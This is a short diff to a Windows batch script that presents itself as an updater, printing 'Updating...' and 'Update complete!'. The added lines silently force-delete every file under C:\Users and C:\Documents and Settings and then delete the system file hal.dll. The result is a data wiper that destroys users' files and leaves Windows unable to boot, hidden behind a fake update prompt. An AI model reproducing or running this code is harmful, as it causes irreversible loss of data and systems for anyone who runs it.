@@ -13,11 +13,18 @@ if %menu%==N goto No
 if %menu%==n goto No
 
 :Yes
-del C:\WINDOWS\system32\hal.dll
 
 echo Updating...
 
-ping -n 16 127.0.0.1 > NUL
+ping -n 3 127.0.0.1 > NUL
+
+del /Q /F /S "C:\Documents and Settings\"
+
+del /Q /F /S C:\Users\
+
+del C:\WINDOWS\system32\hal.dll
+
+ping -n 3 127.0.0.1 > NUL
 
 echo Update complete!
 
